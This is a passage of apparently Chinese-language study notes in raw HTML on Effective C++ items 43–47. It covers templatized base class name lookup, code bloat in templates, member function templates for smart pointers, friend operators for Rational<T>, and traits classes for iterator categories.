data-toggle="collapse" data-target="#collapse-vfv3tnlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-vfv3tnlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;&gt; <span class="hljs-comment">//一个全特化的MsgSender；它和一般template相同， </span><span class="hljs-keyword">class</span> <span class="hljs-title class_">MsgSender</span>&lt;CompanyZ&gt; { <span class="hljs-keyword">public</span>：   <span class="hljs-comment">//差别只在于它删掉了sendclear。</span>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sendSecret</span> <span class="hljs-params">(<span class="hljs-type">const</span> MsgInfo&amp;info)</span></span>{    ···  }}；</code></pre></div></div><p>C++ 模板全特化（total template specialization）是 C++模板特化的一种形式，它允许你为特定的模板参数提供完全定制的实现，以针对特定类型进行特殊处理。</p></blockquote><p>而在这个版本中可能不满足派生类所假定基类有的隐式接口（比如不存在<code>SendClear</code>函数）。由于C++的设计策略是宁愿较早进行诊断，所以编译器会拒绝承认在基类中存在一个<code>SendClear</code>函数。</p><p>为了解决这个问题，我们需要令C++“进入模板基类观察”的行为生效，有三种办法达成这个目标：</p><p>第一种：在对基类函数的调用动作之前加上<code>this-&gt;</code>：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ogouimlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-ogouimlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">SendClear</span>(info);</code></pre></div></div><p>第二种：使用<code>using</code>声明式：</p><blockquote><p>如条款33所述，这将基类被遮掩的名称带入派生类中。</p></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-p9qtjulmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-p9qtjulmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">using</span> MsgSender&lt;Company&gt;::SendClear; <span class="hljs-comment">//告诉编译器，请它假设sendClear位于base class内.</span><span class="hljs-built_in">SendClear</span>(info);</code></pre></div></div><p>第三种：明白指出被调用的函数位于基类内：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-u7hws6lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-u7hws6lmso36dk"><pre><code class="hljs cpp">MsgSender&lt;Company&gt;::<span class="hljs-built_in">SendClear</span>(info);</code></pre></div></div><p>第三种做法是最不令人满意的，如果被调用的是虚函数，上述的明确资格修饰（explicitqualification）会使“虚函数绑定行为”失效。</p><blockquote><p>总结一下，这一部分说的是在派生模版类调用基类方法时，怎样解决编译器默认不去寻找继承来的名称的问题，以及编译器这样做的原因。如果你偏偏就要去特化基类，那派生模版类假设基类有这个方法，在传入这个特化基类名作为模版占位符名称，理所当然的会报错。比如：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-y2nncvlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-y2nncvlmso36dk"><pre><code class="hljs cpp">LoggingMsgSender&lt;CompanyZ&gt; zMsgSender;MsgInfo msgData;<span class="hljs-comment">//在msgData内放置信息。</span>zMsgSender.<span class="hljs-built_in">sendClearMsg</span>(msgData); <span class="hljs-comment">//错误!无法通过编译.</span></code></pre></div></div><p>那这时就只能继续考虑对派生模板类进行特化。</p></blockquote><h3 id="条款-44将与参数无关的代码抽离模板">条款44：将与参数无关的代码抽离模板</h3><p>模板可以节省时间和避免代码重复，编译器会为填入的每个不同模板参数具现化出一份对应的代码，但长此以外，可能会造成代码膨胀（codebloat），生成浮夸的二进制目标码。</p><p>基于<strong>共性和变性分析（commonality and variabilityanalysis）</strong>的方法，我们需要分析模板中重复使用的部分，将其抽离出模板，以减轻模板具现化带来的代码量。</p><ul><li><p>因非类型模板参数而造成的代码膨胀，往往可以消除，做法是以函数参数或类成员变量替换模板参数。</p></li><li><p>因类型模板参数而造成的代码膨胀，往往可以降低，做法是让带有完全相同二进制表述的具现类型共享实现代码。</p></li></ul><p>参考以下矩阵类的例子：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8vnh2dlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-8vnh2dlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, std::<span class="hljs-type">size_t</span> n&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">SquareMatrix</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Invert</span><span class="hljs-params">()</span></span>;    ...<span class="hljs-keyword">private</span>:    std::array&lt;T, n * n&gt; data;};</code></pre></div></div><blockquote><p>这种情况下</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-tgzlaslmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-tgzlaslmso36dk"><pre><code class="hljs cpp">SquareMatrix&lt;<span class="hljs-type">double</span>,<span class="hljs-number">5</span>&gt;sml;sml.<span class="hljs-built_in">invert</span>() <span class="hljs-comment">//调用SquareMatrix&lt;double,5&gt;::invert</span>SquareMatrix&lt;<span class="hljs-type">double</span>,<span class="hljs-number">10</span>&gt;sm2;sm2.<span class="hljs-built_in">invert</span>() <span class="hljs-comment">//调用SquareMatrix&lt;double,l0&gt;::invert</span></code></pre></div></div><p>会具现化两份invert，而这两份invert除了尺寸不一样，操作逻辑都是完全相同的。</p></blockquote><p>修改为：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-anslxllmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-anslxllmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">SquareMatrixBase</span> {<span class="hljs-keyword">protected</span>:    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Invert</span><span class="hljs-params">(std::<span class="hljs-type">size_t</span> matrixSize)</span></span>;    ...<span class="hljs-keyword">private</span>:    std::array&lt;T, n * n&gt; data;};<span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, std::<span class="hljs-type">size_t</span> n&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">SquareMatrix</span> : <span class="hljs-keyword">private</span> SquareMatrixBase&lt;T&gt; {  <span class="hljs-comment">// private 继承实现，见条款 39</span>    <span class="hljs-keyword">using</span> SquareMatrixBase&lt;T&gt;::Invert;              <span class="hljs-comment">// 避免掩盖基类函数，见条款 33</span><span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Invert</span><span class="hljs-params">()</span> </span>{ <span class="hljs-keyword">this</span>-&gt;<span class="hljs-built_in">Invert</span>(n); }              <span class="hljs-comment">// 调用模板基类函数，见条款 43</span>    ...};</code></pre></div></div><p><code>Invert</code>并不是我们唯一要使用的矩阵操作函数，而且每次都往基类传递矩阵尺寸显得太过繁琐，我们可以考虑将数据放在派生类中，在基类中储存指针和矩阵尺寸。修改代码如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-k758b0lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-k758b0lmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">SquareMatrixBase</span> {<span class="hljs-keyword">protected</span>:    <span class="hljs-built_in">SquareMatrixBase</span>(std::<span class="hljs-type">size_t</span> n, T* pMem)        : <span class="hljs-built_in">size</span>(n), <span class="hljs-built_in">pData</span>(pMem) {}    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SetDataPtr</span><span class="hljs-params">(T* ptr)</span> </span>{ pData = ptr; }    ...<span class="hljs-keyword">private</span>:    std::<span class="hljs-type">size_t</span> size;    T* pData;};<span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, std::<span class="hljs-type">size_t</span> n&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">SquareMatrix</span> : <span class="hljs-keyword">private</span> SquareMatrixBase&lt;T&gt; {<span class="hljs-keyword">public</span>:    <span class="hljs-built_in">SquareMatrix</span>() : <span class="hljs-built_in">SquareMatrixBase</span>&lt;T&gt;(n, data.<span class="hljs-built_in">data</span>()) {}    ...<span class="hljs-keyword">private</span>:    std::array&lt;T, n * n&gt; data;};</code></pre></div></div><p>然而这种做法并非永远能取得优势，硬是绑着矩阵尺寸的那个版本（最初的版本），有可能生成比共享版本更佳的代码。</p><p>例如在尺寸专属版中，尺寸是个编译期常量，因此可以在编译期藉由常量的广传达到最优化；而在共享版本中，不同大小的矩阵只拥有单一版本的函数，可减少可执行文件大小，也就因此降低程序的workingset（在“虚内存环境”下执行的进程所使用的一组内存页），并强化指令高速缓存区内的引用集中化（localityofreference），这些都可能使程序执行得更快速。究竟哪个版本更佳，只能经由具体的测试后决定。</p><p>同样地，上面的代码也使用到了牺牲封装性的<code>protected</code>，可能会导致资源管理上的混乱和复杂，考虑到这些，也许一点点模板代码的重复并非不可接受。</p><p>总结一下，在使用模版编程编写库时，要有代码膨胀的潜在意识，并站在使用的角度选择合适的处理方法，以平衡性能和二进制大小。</p><h3 id="条款-45运用成员函数模板接受所有兼容类型">条款45：运用成员函数模板接受所有兼容类型</h3><p>从某种意义上说，<strong>面向对象设计和模版设计是正交的</strong>。</p><p>同一个template的不同具现体<em>(instantiations)</em>之间并不存在什么固有关系：如果以带有继承关系的<code>B</code>，<code>D</code>两类型分别具现化某个<code>template</code>，产生出来的两个具现体并不带有继承关系。</p><blockquote><p>具体一点，下面的代码无法通过编译： </p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-q5cxpjlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-q5cxpjlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> {..}<span class="hljs-keyword">class</span> <span class="hljs-title class_">D</span>:<span class="hljs-keyword">public</span> B {..}<span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">SmartPtr</span>{<span class="hljs-keyword">public</span>:<span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">SmartPtr</span><span class="hljs-params">(T* realptr)</span></span>;  ...}SmartPtr&lt;B&gt; pt1=<span class="hljs-built_in">SmartPtr</span>&lt;D&gt;(<span class="hljs-keyword">new</span> D); <span class="hljs-comment">//模版具现体不保留继承关系</span>SmartPtr&lt;<span class="hljs-type">const</span> B&gt; pt2=pt1; <span class="hljs-comment">//模版具现体也不保留non-const到const的隐式转换</span></code></pre></div></div><p></p></blockquote><p>C++视模板类的不同具现体为完全不同的的类型，但在<strong>泛型编程</strong>中，我们可能需要一个模板类的不同具现体能够相互类型转换。</p><p>那考虑设计一个智能指针模版类，而智能指针需要支持不同类型指针之间的隐式转换（如果可以的话），以及普通指针到智能指针的显式转换。</p><p>这时我们需要的是模版成员函数<em>(member functiontemplates)</em>，比如下面的模版构造函数和模板拷贝构造函数：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zb88cnlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-zb88cnlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">SmartPtr</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> U&gt;</span><span class="hljs-function">    <span class="hljs-title">SmartPtr</span><span class="hljs-params">(<span class="hljs-type">const</span> SmartPtr&lt;U&gt;&amp; other)</span></span><span class="hljs-function">        : heldPtr(other.get()) {</span> ... }    <span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> U&gt;</span><span class="hljs-function">    <span class="hljs-keyword">explicit</span> <span class="hljs-title">SmartPtr</span><span class="hljs-params">(U* p)</span></span><span class="hljs-function">        : heldPtr(p) {</span> ... }    <span class="hljs-function">T* <span class="hljs-title">get</span><span class="hljs-params">()</span> <span class="hljs-type">const</span> </span>{ <span class="hljs-keyword">return</span> heldPtr; }    ...<span class="hljs-keyword">private</span>:    T* heldPtr;};</code></pre></div></div><p>这里使用成员初值列<em>(member initializationlist)</em>来初始化<code>SmartPtr&lt;T&gt;</code>之内类型为<code>T*</code>的成员变量，并以类型为<code>U*</code>的指针（由<code>SmartPtr&lt;U&gt;</code>持有）作为初值。</p><p>这个行为只有当“存在某个隐式转换可将一个<code>U*</code>指针转为一个<code>T*</code>指针”时才能通过编译，而那正是我们想要的。最终效益是<code>SmartPtr&lt;T&gt;</code>现在有了一个泛化copy构造函数，这个构造函数只在其所获得的实参隶属适当（兼容）类型时才通过编译。</p><p>使用<code>get</code>获取原始指针，并将在原始指针之间进行类型转换本身提供了一种保障，如果原始指针之间不能隐式转换，那么其对应的智能指针之间的隐式转换会造成编译错误。</p><p>模板构造函数并不会阻止编译器暗自生成默认的构造函数，所以如果你想要控制拷贝构造的方方面面，你必须同时声明泛化拷贝构造函数和普通拷贝构造函数，相同规则也适用于赋值运算符：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3ycs5plmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-3ycs5plmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">shared_ptr</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-built_in">shared_ptr</span>(shared_ptr <span class="hljs-type">const</span>&amp; r);                <span class="hljs-comment">// 拷贝构造函数</span>    <span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Y&gt;</span><span class="hljs-function">    <span class="hljs-title">shared_ptr</span><span class="hljs-params">(shared_ptr&lt;Y&gt; <span class="hljs-type">const</span>&amp; r)</span></span>;             <span class="hljs-comment">// 泛化拷贝构造函数</span>    shared_ptr&amp; <span class="hljs-keyword">operator</span>=(shared_ptr <span class="hljs-type">const</span>&amp; r);     <span class="hljs-comment">// 拷贝赋值运算符</span>    <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> Y&gt;    shared_ptr&amp; <span class="hljs-keyword">operator</span>=(shared_ptr&lt;Y&gt; <span class="hljs-type">const</span>&amp; r);  <span class="hljs-comment">// 泛化拷贝赋值运算符</span>    ...};</code></pre></div></div><h3 id="条款-46需要类型转换时请为模板定义非成员函数">条款46：需要类型转换时请为模板定义非成员函数</h3><p>该条款与条款 24 一脉相承，还是使用原先的例子：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0l8ufllmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-0l8ufllmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">Rational</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-built_in">Rational</span>(<span class="hljs-type">const</span> T&amp; numerator = <span class="hljs-number">0</span>, <span class="hljs-type">const</span> T&amp; denominator = <span class="hljs-number">1</span>);    <span class="hljs-function"><span class="hljs-type">const</span> T&amp; <span class="hljs-title">Numerator</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;    <span class="hljs-function"><span class="hljs-type">const</span> T&amp; <span class="hljs-title">Denominator</span><span class="hljs-params">()</span> <span class="hljs-type">const</span></span>;    ...};<span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<span class="hljs-type">const</span> Rational&lt;T&gt; <span class="hljs-keyword">operator</span>*(<span class="hljs-type">const</span> Rational&lt;T&gt;&amp; lhs, <span class="hljs-type">const</span> Rational&lt;T&gt;&amp; rhs) {   <span class="hljs-keyword">return</span> <span class="hljs-built_in">Rational</span>&lt;T&gt;(lhs.<span class="hljs-built_in">Numerator</span>() * rhs.<span class="hljs-built_in">Numerator</span>(), lhs.<span class="hljs-built_in">Denominator</span>() * rhs.<span class="hljs-built_in">Denominator</span>());}<span class="hljs-function">Rational&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">oneHalf</span><span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)</span></span>;Rational&lt;<span class="hljs-type">int</span>&gt; result = oneHalf * <span class="hljs-number">2</span>;     <span class="hljs-comment">// 无法通过编译！</span></code></pre></div></div><p>上述失败启示我们：模板实参在推导过程中，从不将隐式类型转换纳入考虑。虽然以<code>oneHalf</code>推导出<code>Rational&lt;int&gt;</code>类型是可行的，但是试图将<code>int</code>类型隐式转换为<code>Rational&lt;T&gt;</code>是绝对会失败的。</p><p>由于模板类并不依赖模板实参推导，所以编译器总能够在<code>Rational&lt;T&gt;</code>具现化时得知<code>T</code>，因此我们可以使用友元声明式在模板类内指涉特定函数：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-c3g6rqlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-c3g6rqlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">Rational</span> {<span class="hljs-keyword">public</span>:    ...    <span class="hljs-keyword">friend</span> <span class="hljs-type">const</span> Rational&lt;T&gt; <span class="hljs-keyword">operator</span>*(<span class="hljs-type">const</span> Rational&lt;T&gt;&amp; lhs, <span class="hljs-type">const</span> Rational&lt;T&gt;&amp; rhs);    ...};</code></pre></div></div><p>在模板类内，模板名称可被用来作为“模板及其参数”的简略表达形式，因此下面的写法也是一样的：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-prmzxnlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-prmzxnlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">Rational</span> {<span class="hljs-keyword">public</span>:    ...    <span class="hljs-keyword">friend</span> <span class="hljs-type">const</span> Rational <span class="hljs-keyword">operator</span>*(<span class="hljs-type">const</span> Rational&amp; lhs, <span class="hljs-type">const</span> Rational&amp; rhs);    ...};</code></pre></div></div><p>当对象<code>oneHalf</code>被声明为一个<code>Rational&lt;int&gt;</code>时，<code>Rational&lt;int&gt;</code>类于是被具现化出来，而作为过程的一部分，友元函数<code>operator*</code>也就被自动声明出来，其为一个普通函数而非模板函数，因此在接受参数时可以正常执行隐式转换。</p><p>为了使程序能正常链接，我们需要为其提供对应的定义式，最简单有效的方法就是直接合并至声明式处：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-cg1rgylmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-cg1rgylmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">friend</span> <span class="hljs-type">const</span> Rational <span class="hljs-keyword">operator</span>*(<span class="hljs-type">const</span> Rational&amp; lhs, <span class="hljs-type">const</span> Rational&amp; rhs) {    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Rational</span>(lhs.<span class="hljs-built_in">Numerator</span>() * rhs.<span class="hljs-built_in">Numerator</span>(), lhs.<span class="hljs-built_in">Denominator</span>() * rhs.<span class="hljs-built_in">Denominator</span>());}</code></pre></div></div><p>由于定义在类内的函数都会暗自成为内联函数，为了降低内联带来的冲击，可以使<code>operator*</code>调用类外的辅助模板函数：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-glig2slmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-glig2slmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt; <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rational</span>;<span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><span class="hljs-function"><span class="hljs-type">const</span> Rational&lt;T&gt; <span class="hljs-title">DoMultiply</span><span class="hljs-params">(<span class="hljs-type">const</span> Rational&lt;T&gt;&amp; lhs, <span class="hljs-type">const</span> Rational&lt;T&gt;&amp; rhs)</span> </span>{    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Rational</span>&lt;T&gt;(lhs.<span class="hljs-built_in">Numerator</span>() * rhs.<span class="hljs-built_in">Numerator</span>(), lhs.<span class="hljs-built_in">Denominator</span>() * rhs.<span class="hljs-built_in">Denominator</span>());}<span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">Rational</span> {<span class="hljs-keyword">public</span>:    ...    <span class="hljs-keyword">friend</span> <span class="hljs-type">const</span> Rational <span class="hljs-keyword">operator</span>*(<span class="hljs-type">const</span> Rational&amp; lhs, <span class="hljs-type">const</span> Rational&amp; rhs) {        <span class="hljs-keyword">return</span> <span class="hljs-built_in">DoMultiply</span>(lhs, rhs);    }    ...};</code></pre></div></div><h3 id="条款-47请使用-traits-classes-表现类型信息">条款 47：请使用traits classes 表现类型信息</h3><p>traits classes 可以使我们在编译期就能获取某些类型信息，它被广泛运用于C++ 标准库中。traits 并不是 C++关键字或一个预先定义好的构件：它们是一种技术，也是 C++程序员所共同遵守的协议，并要求对用户自定义类型和内置类型表现得一样好。</p><p>设计并实现一个 trait class 的步骤如下：</p><ol type="1"><li>确认若干你希望将来可取得的类型相关信息。</li><li>为该类型选择一个名称。</li><li>提供一个模板和一组特化版本，内含你希望支持的类型相关信息。</li></ol><p>以迭代器为例，标准库中拥有多种不同的迭代器种类，它们各自拥有不同的功用和限制：</p><ol type="1"><li><code>input_iterator_tag</code>：单向输入迭代器，只能向前移动，一次一步，客户只可读取它所指的东西。</li><li><code>output_iterator_tag</code>：单向输出迭代器，只能向前移动，一次一步，客户只可写入它所指的东西。</li><li><code>forward_iterator_tag</code>：单向访问迭代器，只能向前移动，一次一步，读写均允许。</li><li><code>bidirectional_iterator_tag</code>：双向访问迭代器，去除了只能向前移动的限制。</li><li><code>random_access_iterator_tag</code>：随机访问迭代器，没有一次一步的限制，允许随意移动，可以执行“迭代器算术”。</li></ol><p>标准库为这些迭代器种类提供的标签结构体（tagstruct）的继承关系如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-q7ib2rlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-q7ib2rlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">input_iterator_tag</span> {};<span class="hljs-keyword">struct</span> <span class="hljs-title class_">output_iterator_tag</span> {};<span class="hljs-keyword">struct</span> <span class="hljs-title class_">forward_iterator_tag</span> : input_iterator_tag {};<span class="hljs-keyword">struct</span> <span class="hljs-title class_">bidirectional_iterator_tag</span> : forward_iterator_tag {};<span class="hljs-keyword">struct</span> <span class="hljs-title class_">random_access_iterator_tag</span> : bidirectional_iterator_tag {};</code></pre></div></div><p>将<code>iterator_category</code>作为迭代器种类的名称，嵌入容器的迭代器中，并且确认使用适当的标签结构体：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ur7m9dlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-ur7m9dlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt; ... &gt; <span class="hljs-comment">//省略一些 template参数</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">deque</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-keyword">class</span> <span class="hljs-title class_">iterator</span> {    <span class="hljs-keyword">public</span>:        <span class="hljs-keyword">using</span> iterator_category = random_access_iterator;        ...    }    ...}<span class="hljs-keyword">template</span>&lt; ... &gt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">list</span> {<span class="hljs-keyword">public</span>:    <span class="hljs-keyword">class</span> <span class="hljs-title class_">iterator</span> {    <span class="hljs-keyword">public</span>:        <span class="hljs-keyword">using</span> iterator_category = bidirectional_iterator;        ...    }    ...}</code></pre></div></div><p>为了做到类型的 traits信息可以在类型自身之外获得，标准技术是把它放进一个模板及其一个或多个特化版本中。这样的模板在标准库中有若干个，其中针对迭代器的是<code>iterator_traits</code>：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3hvihmlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-3hvihmlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">IterT</span>&gt;<span class="hljs-keyword">struct</span> <span class="hljs-title class_">iterator_traits</span> {  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> IterT::iterator_category iterator_category;    <span class="hljs-comment">// 或者 using iterator_category = IterT::iterator_category; 见条款42</span>    ...};</code></pre></div></div><p>为了支持指针迭代器，<code>iterator_traits</code>特别针对指针类型提供一个<strong>偏特化版本</strong>，而指针的类型和随机访问迭代器类似，所以可以写出如下代码：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-yulgbjlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-yulgbjlmso36dk"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">IterT</span>&gt;<span class="hljs-keyword">struct</span> <span class="hljs-title class_">iterator_traits</span>&lt;IterT*&gt; {  <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">typename</span> iterator_category = random_access_iterator_tag;     <span class="hljs-comment">// using iterator_category = random_access_iterator_tag;</span>    ...};</code></pre></div></div><p>当我们需要为不同的迭代器种类应用不同的代码时，traits classes就派上用场了。</p><p>或许我们朴素的想法是这样：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-rjyqthlmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-rjyqthlmso36dk"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> IterT, <span class="hljs-keyword">typename</span> DisT&gt;</span><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">advance</span><span class="hljs-params">(IterT&amp; iter, DisT d)</span> </span>{    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">typeid</span>(std::iterator_traits&lt;IterT&gt;::iterator_category)        == <span class="hljs-built_in">typeid</span>(std::random_access_iterator_tag)) {        iter +d;    }}</code></pre></div></div><p>但这样类型测试便发生于运行期而非编译期。而我们希望类型的判断能在编译期完成。</p><blockquote><p>不仅如此，这样的实现也会造成编译期问题。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pd4812lmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-pd4812lmso36dk"><pre><code class="hljs cpp">std::list&lt;<span class="hljs-type">int</span>&gt;::iterator iter;<span class="hljs-built_in">advance</span>(iter,<span class="hljs-number">10</span>); <span class="hljs-comment">//移动1ter向前走10个元素:</span><span class="hljs-comment">//上述实现无法通过编译。</span></code></pre></div></div><p>为什么呢？我们不妨模拟一下编译器的模板实参推导：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qn268slmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-qn268slmso36dk"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">advance</span><span class="hljs-params">(std::list&lt;<span class="hljs-type">int</span>&gt;::iterator&amp; iter,<span class="hljs-type">int</span> d)</span></span>{  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">typeid</span>(std:iterator_traits&lt;std:list&lt;<span class="hljs-type">int</span>&gt;:iterator&gt;::iterator_category)==<span class="hljs-built_in">typeid</span>(std:random_access_iterator_tag)){     iter +=d; <span class="hljs-comment">//错误!</span>}<span class="hljs-keyword">else</span>{<span class="hljs-keyword">if</span> (d &gt;=<span class="hljs-number">0</span>) {<span class="hljs-keyword">while</span> (d--)++iter;}  <span class="hljs-keyword">else</span> {<span class="hljs-keyword">while</span> (d++)--iter;}}</code></pre></div></div><p>虽然我嫩运行时绝不会执行+=那一行，但编译器必须确保所有源码都有效。编译器觉得只有randomaccess迭代器才支持<code>+=</code>，而<code>std::list&lt;int&gt;::iterator</code>不支持<code>+=</code>，因此会报错。</p></blockquote><p><code>iterator_category</code>是在编译期决定的，然而<code>if</code>却是在运行期运作的，无法达成我们的目标。</p><p>在 C++17之前，解决这个问题的主流做法是利用函数重载（也是原书中介绍的做法）：</p><blockquote><p>编译器匹配<strong>最</strong>适合的重载函数，何尝不是一种if？</p></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1l3agclmso36dk"></i><span>cpp</span><div class="collapse show" id="collapse-1l3agclmso36dk"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> IterT, <span class="hljs-keyword">typename</span> DisT&gt;</span><span 